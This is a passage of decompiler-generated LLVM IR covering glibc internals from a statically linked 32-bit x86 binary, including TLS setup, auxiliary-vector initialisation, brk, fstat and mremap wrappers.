  store i32 %v5_8065e5a, i32* %edx.global-to-local, align 4
  %v2_8065e5e = add i32 %v2_8065e55, 4
  %v3_8065e5e = inttoptr i32 %v2_8065e5e to i32*
  store i32 %v1_8065e57, i32* %v3_8065e5e, align 4
  %v0_8065e61 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065e61 = add i32 %v0_8065e61, 8
  store i32 %v1_8065e61, i32* @ebx, align 4
  %v0_8065e64 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065e64 = load i32, i32* @global_var_8078c34.1621, align 4
  %v2_8065e64 = add i32 %v1_8065e64, %v0_8065e64
  %v0_8065e6a = load i32, i32* @global_var_8078c40.1619, align 64
  store i32 %v2_8065e64, i32* @global_var_8078c34.1621, align 4
  %tmp20 = icmp ule i32 %v2_8065e64, %v0_8065e6a
  %v5_8065e7c = select i1 %tmp20, i32 %v0_8065e6a, i32 %v2_8065e64
  store i32 %v5_8065e7c, i32* @ecx, align 4
  %v1_8065e7f = load i32, i32* @global_var_8078c38.1622, align 8
  %v2_8065e7f = add i32 %v1_8065e7f, %v2_8065e64
  store i32 %v5_8065e7c, i32* @global_var_8078c40.1619, align 64
  %v1_8065e8b = load i32, i32* @global_var_8078c44.1623, align 4
  %tmp25 = icmp ule i32 %v2_8065e7f, %v1_8065e8b
  %v5_8065e91 = select i1 %tmp25, i32 %v1_8065e8b, i32 %v2_8065e7f
  store i32 %v5_8065e91, i32* %edx.global-to-local, align 4
  store i32 %v5_8065e91, i32* @global_var_8078c44.1623, align 4
  br label %dec_label_pc_8065ee9

dec_label_pc_8065ea0:                             ; preds = %dec_label_pc_8065e37
  %v2_8065ea0 = load i32, i32* %stack_var_-44, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v1_8065ea7 = add i32 %v2_8065ea0, 4
  store i32 %v1_8065ea7, i32* %eax.global-to-local, align 4
  %v10_8065eaa = icmp ult i32 %v1_8065c64, %v1_8065ea7
  %v1_8065eae = icmp eq i1 %v10_8065eaa, false
  br i1 %v1_8065eae, label %dec_label_pc_8065ee9, label %dec_label_pc_8065eb0

dec_label_pc_8065eb0:                             ; preds = %dec_label_pc_8065ea0
  %v1_8065eb7 = add i32 %v2_8065ea0, -7
  store i32 %v1_8065eb7, i32* %eax.global-to-local, align 4
  %v1_8065ebb = call i32 @malloc(i32 %v1_8065eb7)
  store i32 %v1_8065ebb, i32* %eax.global-to-local, align 4
  %v1_8065ec3 = icmp eq i32 %v1_8065ebb, 0
  store i32 %v1_8065ebb, i32* @ebx, align 4
  br i1 %v1_8065ec3, label %dec_label_pc_8065ee9, label %dec_label_pc_8065ec9

dec_label_pc_8065ec9:                             ; preds = %dec_label_pc_8065eb0
  %v1_8065ece = add i32 %v1_8065c64, -8
  store i32 %v1_8065ece, i32* %eax.global-to-local, align 4
  %v3_8065ed7 = inttoptr i32 %v1_8065ebb to i8*
  %v4_8065ed7 = call i32 @memcpy(i8* %v3_8065ed7, i32 %tmp7, i32 %v1_8065ece)
  store i32 %v4_8065ed7, i32* %eax.global-to-local, align 4
  store i32 %v1_8065ebb, i32* %edx.global-to-local, align 4
  %v1_8065ee1 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065ee6

dec_label_pc_8065ee6:                             ; preds = %dec_label_pc_8065da0, %dec_label_pc_8065ec9
  %storemerge = phi i32 [ %v1_8065ee1, %dec_label_pc_8065ec9 ], [ %v1_8065daa, %dec_label_pc_8065da0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ee9

dec_label_pc_8065ee9:                             ; preds = %dec_label_pc_8065eb0, %dec_label_pc_8065ea0, %dec_label_pc_8065e09, %dec_label_pc_8065d02, %dec_label_pc_8065e51, %dec_label_pc_8065e01, %dec_label_pc_8065c9f, %dec_label_pc_8065ee6
  store i32 %v2_8065c0e, i32* %eax.global-to-local, align 4
  %v3_8065ef2 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8065ef2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ef7

dec_label_pc_8065ef7:                             ; preds = %dec_label_pc_8065bf2, %dec_label_pc_8065bde, %dec_label_pc_8065ee9
  br label %dec_label_pc_8065efa

dec_label_pc_8065efa:                             ; preds = %dec_label_pc_8065c2c, %dec_label_pc_8065ef7
  %v0_8065efd = load i32, i32* @ebx, align 4
  store i32 %v0_8065efd, i32* %eax.global-to-local, align 4
  store i32 %v0_8065bcf, i32* @ebx, align 4
  store i32 %v0_8065bce, i32* @esi, align 4
  store i32 %v0_8065bcd, i32* @edi, align 4
  store i32 %v0_8065bcc, i32* @ebp, align 4
  ret i32 %v0_8065efd

; uselistorder directives
  uselistorder i32 %v1_8065e8b, { 1, 0 }
  uselistorder i32 %v2_8065e7f, { 1, 0 }
  uselistorder i32 %v0_8065e6a, { 1, 0 }
  uselistorder i32 %v2_8065e64, { 0, 3, 1, 2 }
  uselistorder i32 %v7_8065e44, { 1, 0, 2 }
  uselistorder i32 %v2_8065e23, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_8065e11, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8065dd3, { 1, 0 }
  uselistorder i32 %v4_8065db6, { 1, 0, 2 }
  uselistorder i32 %v1_8065d3b, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8065d0f, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 %v3_8065cc4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8065c81, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8065c64, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 16, 5, 6, 9, 8, 17 }
  uselistorder i32 %v1_8065c59, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v7_8065c55, { 3, 0, 4, 5, 1, 6, 2, 7, 9, 8, 10, 11 }
  uselistorder i32 %v0_8065c27, { 1, 0 }
  uselistorder i32 %tmp7, { 14, 4, 13, 12, 11, 10, 1, 9, 5, 0, 8, 3, 2, 7, 6 }
  uselistorder i32 %tmp6, { 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 8, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %ebx.global-to-local, { 5, 1, 0, 2, 3, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* @global_var_80788fc.1609, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_80719f8.1606 to i32), { 4, 0, 5, 1, 6, 2, 7, 3 }
  uselistorder label %dec_label_pc_8065efa, { 1, 0 }
  uselistorder label %dec_label_pc_8065ef7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065ee9, { 7, 0, 1, 4, 2, 5, 3, 6 }
  uselistorder label %dec_label_pc_8065ee6, { 1, 0 }
  uselistorder label %dec_label_pc_8065e01, { 1, 0 }
  uselistorder label %dec_label_pc_8065db4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8065da0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8065cf7, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %v0_8065f04 = load i32, i32* @global_var_8078c5c.1691, align 4
  %v0_8065f0a = load i32, i32* @eax, align 4
  store i32 %v0_8065f0a, i32* @global_var_8078c50.1692, align 16
  %v0_8065f0f = load i32, i32* @edx, align 4
  store i32 %v0_8065f0f, i32* @global_var_8078c54.1693, align 4
  %v1_8065f15 = add i32 %v0_8065f04, 15
  %v2_8065f18 = add i32 %v1_8065f15, %v0_8065f0a
  %v0_8065f1a = load i32, i32* @global_var_8078c58.1694, align 8
  %v1_8065f1f = and i32 %v2_8065f18, -16
  store i32 %v1_8065f1f, i32* @global_var_8078c5c.1691, align 4
  store i32 %v0_8065f1a, i32* @global_var_8078c6c.1695, align 4
  ret i32 %v0_8065f1a

; uselistorder directives
  uselistorder i32 %v0_8065f1a, { 1, 0 }
}

define i32 @_dl_tls_setup() local_unnamed_addr {
entry:
  store i32 16, i32* @edx, align 4
  store i32 1120, i32* @eax, align 4
  store i32 64, i32* @global_var_8078504.1696, align 4
  store i32 1, i32* @global_var_8078c58.1694, align 8
  store i32 ptrtoint (i32* @global_var_8078504.1696 to i32), i32* @global_var_8078c60.1697, align 32
  %v0_8065f56 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @__libc_setup_tls(i32 %arg1, i64 %arg2) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065f5f = load i32, i32* @edi, align 4
  %v0_8065f60 = load i32, i32* @esi, align 4
  %v0_8065f61 = load i32, i32* @ebx, align 4
  %v0_8065f65 = load i32, i32* @global_var_8078c70.1698, align 16
  %v4_8065f6b = trunc i64 %arg2 to i32
  %v1_8065f6f = icmp eq i32 %v0_8065f65, 0
  %v1_8065f73 = icmp eq i1 %v1_8065f6f, false
  br i1 %v1_8065f73, label %dec_label_pc_8065f9f.preheader, label %dec_label_pc_8065fae

dec_label_pc_8065f9f.preheader:                   ; preds = %entry
  %v0_8065f9f.pre = load i32, i32* @global_var_8078c74.1699, align 4
  %v2_8065fa4 = mul i32 %v0_8065f9f.pre, 32
  %v2_8065fa7 = add i32 %v2_8065fa4, %v0_8065f65
  %v7_8065faa42 = icmp ult i32 %v0_8065f65, %v2_8065fa7
  br i1 %v7_8065faa42, label %dec_label_pc_8065f77, label %dec_label_pc_8065fae.loopexit

dec_label_pc_8065f77:                             ; preds = %dec_label_pc_8065f9f.preheader, %dec_label_pc_8065f9c
  %v0_8065f8243 = phi i32 [ %v1_8065f9c, %dec_label_pc_8065f9c ], [ %v0_8065f65, %dec_label_pc_8065f9f.preheader ]
  %v1_8065f77 = inttoptr i32 %v0_8065f8243 to i32*
  %v2_8065f77 = load i32, i32* %v1_8065f77, align 4
  %v11_8065f77 = icmp eq i32 %v2_8065f77, 7
  %v1_8065f7a = icmp eq i1 %v11_8065f77, false
  br i1 %v1_8065f7a, label %dec_label_pc_8065f9c, label %dec_label_pc_8065f7c

dec_label_pc_8065f7c:                             ; preds = %dec_label_pc_8065f77
  %v1_8065f7c = add i32 %v0_8065f8243, 16
  %v2_8065f7c = inttoptr i32 %v1_8065f7c to i32*
  %v3_8065f7c = load i32, i32* %v2_8065f7c, align 4
  %v1_8065f7f = add i32 %v0_8065f8243, 28
  %v2_8065f7f = inttoptr i32 %v1_8065f7f to i32*
  %v3_8065f7f = load i32, i32* %v2_8065f7f, align 4
  store i32 %v3_8065f7f, i32* @esi, align 4
  %v1_8065f82 = add i32 %v0_8065f8243, 8
  %v2_8065f82 = inttoptr i32 %v1_8065f82 to i32*
  %v3_8065f82 = load i32, i32* %v2_8065f82, align 4
  %v1_8065f85 = add i32 %v0_8065f8243, 20
  %v2_8065f85 = inttoptr i32 %v1_8065f85 to i32*
  %v3_8065f85 = load i32, i32* %v2_8065f85, align 4
  store i32 %v3_8065f85, i32* %ebp.global-to-local, align 4
  store i32 %v3_8065f7c, i32* %stack_var_-44, align 4
  %tmp = icmp ule i32 %v3_8065f7f, %v4_8065f6b
  %v5_8065f8f = select i1 %tmp, i32 %v4_8065f6b, i32 %v3_8065f7f
  br label %dec_label_pc_8065fc5

dec_label_pc_8065f9c:                             ; preds = %dec_label_pc_8065f77
  %v1_8065f9c = add i32 %v0_8065f8243, 32
  %v7_8065faa = icmp ult i32 %v1_8065f9c, %v2_8065fa7
  br i1 %v7_8065faa, label %dec_label_pc_8065f77, label %dec_label_pc_8065f9f.dec_label_pc_8065fae.loopexit_crit_edge

dec_label_pc_8065f9f.dec_label_pc_8065fae.loopexit_crit_edge: ; preds = %dec_label_pc_8065f9c
  br label %dec_label_pc_8065fae.loopexit

dec_label_pc_8065fae.loopexit:                    ; preds = %dec_label_pc_8065f9f.dec_label_pc_8065fae.loopexit_crit_edge, %dec_label_pc_8065f9f.preheader
  br label %dec_label_pc_8065fae

dec_label_pc_8065fae:                             ; preds = %dec_label_pc_8065fae.loopexit, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8065fc5

dec_label_pc_8065fc5:                             ; preds = %dec_label_pc_8065f7c, %dec_label_pc_8065fae
  %v1_8065fd2 = phi i32 [ %v3_8065f85, %dec_label_pc_8065f7c ], [ 0, %dec_label_pc_8065fae ]
  %stack_var_-36.0.in = phi i32 [ %v5_8065f8f, %dec_label_pc_8065f7c ], [ %v4_8065f6b, %dec_label_pc_8065fae ]
  %stack_var_-40.0 = phi i32 [ %v3_8065f82, %dec_label_pc_8065f7c ], [ 0, %dec_label_pc_8065fae ]
  %v1_8065fc9 = load i32, i32* @global_var_8078c5c.1691, align 4
  %v2_8065fc9 = add i32 %v4_8065f6b, -1
  %v2_8065fd2 = add i32 %v2_8065fc9, %v1_8065fd2
  %v3_8065fd2 = add i32 %v2_8065fd2, %v1_8065fc9
  %v2_8065fd8 = zext i32 %v3_8065fd2 to i64
  %v7_8065fd8 = and i64 %arg2, 4294967295
  %v8_8065fd8 = udiv i64 %v2_8065fd8, %v7_8065fd8
  %sext = mul nuw i64 %v8_8065fd8, 4294967296
  %v2_8065fe0 = sdiv i64 %sext, 4294967296
  %v4_8065fe0 = mul nsw i64 %v2_8065fe0, %arg2
  %v5_8065fe0 = trunc i64 %v4_8065fe0 to i32
  store i32 %v5_8065fe0, i32* @ebx, align 4
  %v5_8065fe3 = add i32 %stack_var_-36.0.in, %arg1
  %v2_8065fe7 = add i32 %v5_8065fe0, %v5_8065fe3
  %v1_8065fea = call i32 @__GI_sbrk(i32 %v2_8065fe7)
  store i32 62, i32* @global_var_8078304.1700, align 4
  %v2_8066000 = add i32 %stack_var_-36.0.in, -1
  %v3_8066000 = add i32 %v2_8066000, %v1_8065fea
  %v1_8066004 = sub i32 0, %stack_var_-36.0.in
  %v2_8066006 = and i32 %v3_8066000, %v1_8066004
  %v0_8066008 = load i32, i32* @esi, align 4
  %v1_8066008 = icmp eq i32 %v0_8066008, 0
  %v1_806600a = load i32, i32* @ebx, align 4
  %v2_806600a = add i32 %v1_806600a, %v2_8066006
  store i32 %v2_806600a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8066008, label %dec_label_pc_8066018, label %dec_label_pc_806600f

dec_label_pc_806600f:                             ; preds = %dec_label_pc_8065fc5
  %v1_806600f = add i32 %v0_8066008, -1
  br label %dec_label_pc_8066024

dec_label_pc_8066018:                             ; preds = %dec_label_pc_8065fc5
  br label %dec_label_pc_8066024

dec_label_pc_8066024:                             ; preds = %dec_label_pc_806600f, %dec_label_pc_8066018
  %storemerge7 = phi i32 [ %v1_806600f, %dec_label_pc_806600f ], [ 0, %dec_label_pc_8066018 ]
  %storemerge6 = phi i32 [ %v0_8066008, %dec_label_pc_806600f ], [ 1, %dec_label_pc_8066018 ]
  %v1_8066024 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8066024 = add i32 %v1_8066024, %storemerge7
  %tmp36 = urem i32 %v2_8066024, %storemerge6
  %v4_806602c47 = sub i32 %tmp36, %v2_8066024
  %v2_8066031 = add i32 %v2_806600a, %v4_806602c47
  store i32 %v2_8066031, i32* @global_var_8078314.1701, align 4
  br i1 %v1_8066008, label %dec_label_pc_8066045, label %dec_label_pc_806603c

dec_label_pc_806603c:                             ; preds = %dec_label_pc_8066024
  %v1_806603c = add i32 %v0_8066008, -1
  br label %dec_label_pc_8066051

dec_label_pc_8066045:                             ; preds = %dec_label_pc_8066024
  br label %dec_label_pc_8066051

dec_label_pc_8066051:                             ; preds = %dec_label_pc_806603c, %dec_label_pc_8066045
  %storemerge8 = phi i32 [ %v1_806603c, %dec_label_pc_806603c ], [ 0, %dec_label_pc_8066045 ]
  %storemerge5 = phi i32 [ %v0_8066008, %dec_label_pc_806603c ], [ 1, %dec_label_pc_8066045 ]
  %v2_8066053 = add i32 %storemerge8, %v1_8066024
  store i8 1, i8* bitcast (i32* @global_var_8078318.1702 to i8*), align 8
  %div3 = urem i32 %v2_8066053, %storemerge5
  %v4_8066060 = sub i32 %v2_8066053, %div3
  %v3_8066064 = load i32, i32* %stack_var_-44, align 4
  store i32 %v4_8066060, i32* @global_var_8078834.1703, align 4
  %v3_8066078 = inttoptr i32 %v2_8066031 to i8*
  %v4_8066078 = call i32 @memcpy(i8* %v3_8066078, i32 %stack_var_-40.0, i32 %v3_8066064)
  %v0_8066082 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066082 = add i32 %v0_8066082, 4
  %v2_8066082 = inttoptr i32 %v1_8066082 to i32*
  store i32 ptrtoint (i32* @global_var_807830c.1704 to i32), i32* %v2_8066082, align 4
  %v0_8066089 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066089 = inttoptr i32 %v0_8066089 to i32*
  store i32 %v0_8066089, i32* %v2_8066089, align 4
  %v0_806608b = load i32, i32* %ebx.global-to-local, align 4
  %v2_806608b = add i32 %v0_806608b, 8
  %v3_806608b = inttoptr i32 %v2_806608b to i32*
  store i32 %v0_806608b, i32* %v3_806608b, align 4
  %v2_8066092 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8066092, i32* %ebx.global-to-local, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  %v1_80660ae = call i32 @int80_syscall(i32 243)
  %v1_80660b3 = icmp eq i32 %v1_80660ae, 0
  br i1 %v1_80660b3, label %dec_label_pc_80660bc, label %dec_label_pc_80660b7

dec_label_pc_80660b7:                             ; preds = %dec_label_pc_8066051
  %v0_80660b7 = call i32 @abort()
  br label %dec_label_pc_80660bc

dec_label_pc_80660bc:                             ; preds = %dec_label_pc_8066051, %dec_label_pc_80660b7
  %v0_80660cd = load i32, i32* @esi, align 4
  %v1_80660cd = icmp eq i32 %v0_80660cd, 0
  %v2_80660cf = load i32, i32* %stack_var_-44, align 4
  store i32 %v0_80660cd, i32* @global_var_807882c.1705, align 4
  %v0_80660d8 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80660d8, i32* @global_var_8078828.1706, align 8
  store i32 %stack_var_-40.0, i32* @global_var_8078820.1707, align 32
  store i32 %v2_80660cf, i32* @global_var_8078824.1708, align 4
  store i32 1, i32* @global_var_8078838.1709, align 8
  store i32 64, i32* @global_var_8078504.1696, align 4
  store i32 1, i32* @global_var_8078c58.1694, align 8
  store i32 ptrtoint (i32* @global_var_8078504.1696 to i32), i32* @global_var_8078c60.1697, align 32
  store i32 ptrtoint (i32* @global_var_807880c.1711 to i32), i32* @global_var_8078520.1710, align 32
  br i1 %v1_80660cd, label %dec_label_pc_8066124, label %dec_label_pc_806611d

dec_label_pc_806611d:                             ; preds = %dec_label_pc_80660bc
  %v1_806611d = add i32 %v0_80660cd, -1
  br label %dec_label_pc_8066130

dec_label_pc_8066124:                             ; preds = %dec_label_pc_80660bc
  br label %dec_label_pc_8066130

dec_label_pc_8066130:                             ; preds = %dec_label_pc_806611d, %dec_label_pc_8066124
  %v0_8066141 = phi i32 [ %v0_80660cd, %dec_label_pc_806611d ], [ 1, %dec_label_pc_8066124 ]
  %v0_8066130 = phi i32 [ %v1_806611d, %dec_label_pc_806611d ], [ 0, %dec_label_pc_8066124 ]
  %v2_8066130 = add i32 %v0_8066130, %v0_80660d8
  %div4 = urem i32 %v2_8066130, %v0_8066141
  %v4_8066141 = sub i32 %v2_8066130, %div4
  %v6_8066144 = icmp ult i32 %stack_var_-36.0.in, 16
  %v1_8066149 = icmp eq i1 %v6_8066144, false
  %v8_8066149 = select i1 %v1_8066149, i32 %stack_var_-36.0.in, i32 16
  store i32 %v8_8066149, i32* @edx, align 4
  %v2_806614e = add i32 %v4_8066141, %arg1
  store i32 %v2_806614e, i32* @eax, align 4
  %v0_8066151 = call i32 @init_static_tls()
  store i32 %v0_8065f61, i32* @ebx, align 4
  store i32 %v0_8065f60, i32* @esi, align 4
  store i32 %v0_8065f5f, i32* @edi, align 4
  ret i32 %v0_8066151

; uselistorder directives
  uselistorder i32 %v0_806608b, { 1, 0 }
  uselistorder i32 %v0_8066089, { 1, 0 }
  uselistorder i32 %v2_8066031, { 1, 0 }
  uselistorder i32 %v0_8066008, { 1, 0, 3, 2, 4 }
  uselistorder i32 %stack_var_-36.0.in, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_8065f9c, { 1, 0 }
  uselistorder i32 %v3_8065f7f, { 1, 0, 2 }
  uselistorder i32 %v0_8065f8243, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_8065fa7, { 1, 0 }
  uselistorder i32 %v4_8065f6b, { 1, 3, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @abort, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8066130, { 1, 0 }
  uselistorder label %dec_label_pc_80660bc, { 1, 0 }
  uselistorder label %dec_label_pc_8066051, { 1, 0 }
  uselistorder label %dec_label_pc_8066024, { 1, 0 }
  uselistorder label %dec_label_pc_8065fc5, { 1, 0 }
  uselistorder label %dec_label_pc_8065f77, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v3_8066168 = call i32 @__libc_setup_tls(i32 1120, i64 16)
  ret i32 %v3_8066168
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8066174 = load i32, i32* @eax, align 4
  %v1_8066174 = add i32 %v0_8066174, 28
  %v2_8066174 = inttoptr i32 %v1_8066174 to i32*
  %v3_8066174 = load i32, i32* %v2_8066174, align 4
  %v1_8066177 = add i32 %v0_8066174, 44
  %v2_8066177 = inttoptr i32 %v1_8066177 to i32*
  %v3_8066177 = load i32, i32* %v2_8066177, align 4
  store i32 %v3_8066174, i32* @global_var_8078c70.1698, align 16
  store i32 %v3_8066177, i32* @global_var_8078c74.1699, align 4
  ret i32 %v3_8066177

; uselistorder directives
  uselistorder i32* @global_var_8078c74.1699, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v0_806618f = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v2_8066196 = add i32 %arg1, 40
  %v3_8066196 = inttoptr i32 %v2_8066196 to i32*
  %v4_8066196 = load i32, i32* %v3_8066196, align 4
  %v5_8066196 = sub i32 %v0_806618f, %v4_8066196
  store i32 %v5_8066196, i32* @esi, align 4
  %v0_8066199 = load i32, i32* inttoptr (i32 4 to i32*), align 4
  %v1_80661a0 = add i32 %arg1, 44
  %v2_80661a0 = inttoptr i32 %v1_80661a0 to i32*
  %v3_80661a0 = load i32, i32* %v2_80661a0, align 4
  %v2_80661a3 = mul i32 %v3_80661a0, 8
  %v3_80661a3 = add i32 %v2_80661a3, %v0_8066199
  store i32 %v3_80661a3, i32* %eax.global-to-local, align 4
  %v2_80661a6 = inttoptr i32 %v3_80661a3 to i32*
  store i32 %v5_8066196, i32* %v2_80661a6, align 4
  %v0_80661a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80661a8 = add i32 %v0_80661a8, 4
  %v2_80661a8 = inttoptr i32 %v1_80661a8 to i8*
  store i8 1, i8* %v2_80661a8, align 1
  %v0_80661ac = load i32, i32* %ecx.global-to-local, align 4
  %v1_80661ac = add i32 %v0_80661ac, 24
  %v2_80661ac = inttoptr i32 %v1_80661ac to i32*
  %v3_80661ac = load i32, i32* %v2_80661ac, align 4
  store i32 %v3_80661ac, i32* %eax.global-to-local, align 4
  %v1_80661af = add i32 %v0_80661ac, 28
  %v2_80661af = inttoptr i32 %v1_80661af to i32*
  %v3_80661af = load i32, i32* %v2_80661af, align 4
  %v1_80661b3 = add i32 %v0_80661ac, 20
  %v2_80661b3 = inttoptr i32 %v1_80661b3 to i32*
  %v3_80661b3 = load i32, i32* %v2_80661b3, align 4
  %v2_80661b6 = sub i32 %v3_80661af, %v3_80661ac
  store i32 %v2_80661b6, i32* @ebx, align 4
  %v0_80661b8 = load i32, i32* @esi, align 4
  %v3_80661b9 = call i32 @__GI_mempcpy(i32 %v0_80661b8, i32 %v3_80661b3, i32 %v3_80661ac)
  store i32 %v3_80661b9, i32* %eax.global-to-local, align 4
  %v0_80661c1 = load i32, i32* @ebx, align 4
  %v3_80661c5 = inttoptr i32 %v3_80661b9 to i8*
  %v4_80661c5 = call i32 @__GI_memset(i8* %v3_80661c5, i32 0, i32 %v0_80661c1)
  store i32 %v4_80661c5, i32* %eax.global-to-local, align 4
  ret i32 %v4_80661c5

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 3, 23, 21, 22, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 0, 1, 2, 15, 16, 17, 18, 19, 20, 24, 25, 26, 28, 27 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ecx, align 4
  %v2_80661de = call i32 @brk(i32* %arg1)
  store i32 %v2_80661de, i32* @global_var_8078840.1669, align 64
  %v7_80661e6 = icmp ult i32 %v2_80661de, %tmp1
  %v1_80661e8 = icmp eq i1 %v7_80661e6, false
  br i1 %v1_80661e8, label %dec_label_pc_80661f9, label %dec_label_pc_80661ea

dec_label_pc_80661ea:                             ; preds = %entry
  store i32 -1, i32* @ecx, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80661f9

dec_label_pc_80661f9:                             ; preds = %entry, %dec_label_pc_80661ea
  %v0_80661f9 = load i32, i32* @ecx, align 4
  ret i32 %v0_80661f9

; uselistorder directives
  uselistorder i32* @global_var_8078840.1669, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80661f9, { 1, 0 }
}

define i32 @fstat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80661fc = load i32, i32* @ebx, align 4
  store i32 %v0_80661fc, i32* %stack_var_-4, align 4
  %v2_8066204 = ptrtoint i32* %stack_var_-100 to i32
  %tmp10 = bitcast i32* %stack_var_-100 to %stat64*
  store i32 %v2_8066204, i32* @ecx, align 4
  %v4_806620f = call i32 @fstat64(i32 %arg1, %stat64* %tmp10)
  %tmp = icmp ult i32 %v4_806620f, -4095
  br i1 %tmp, label %dec_label_pc_806622b, label %dec_label_pc_806621c

dec_label_pc_806621c:                             ; preds = %entry
  %v1_8066221 = sub i32 0, %v4_806620f
  store i32 -1, i32* @ebx, align 4
  store i32 %v1_8066221, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8066240

dec_label_pc_806622b:                             ; preds = %entry
  %v1_806622b = icmp eq i32 %v4_806620f, 0
  store i32 %v4_806620f, i32* @ebx, align 4
  %v1_806622f = icmp eq i1 %v1_806622b, false
  br i1 %v1_806622f, label %dec_label_pc_8066240, label %dec_label_pc_8066231

dec_label_pc_8066231:                             ; preds = %dec_label_pc_806622b
  %v5_8066238 = call i32 @__xstat32_conv(i32* nonnull %stack_var_-100, i32 %arg2, i32 %v4_806620f, i32 %v4_806620f)
  br label %dec_label_pc_8066240

dec_label_pc_8066240:                             ; preds = %dec_label_pc_806622b, %dec_label_pc_806621c, %dec_label_pc_8066231
  %v0_8066243 = load i32, i32* @ebx, align 4
  %v2_8066245 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066245, i32* @ebx, align 4
  ret i32 %v0_8066243

; uselistorder directives
  uselistorder i32 %v4_806620f, { 1, 2, 4, 5, 3, 0 }
  uselistorder label %dec_label_pc_8066240, { 2, 0, 1 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8066248 = load i32, i32* @edi, align 4
  %v0_8066249 = load i32, i32* @esi, align 4
  store i32 %v0_8066249, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_806625e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v7_8066266 = call i32 @mremap(i32 %v0_806625e, i32 %v0_8066249, i32 %v0_8066248, i32 %tmp6, i32 %arg1, i32 %arg2, i32 %arg3)
  %tmp = icmp ult i32 %v7_8066266, -4095
  br i1 %tmp, label %dec_label_pc_8066280, label %dec_label_pc_8066273

dec_label_pc_8066273:                             ; preds = %entry
  %v1_8066278 = sub i32 0, %v7_8066266
  store i32 %v1_8066278, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8066280

dec_label_pc_8066280:                             ; preds = %entry, %dec_label_pc_8066273
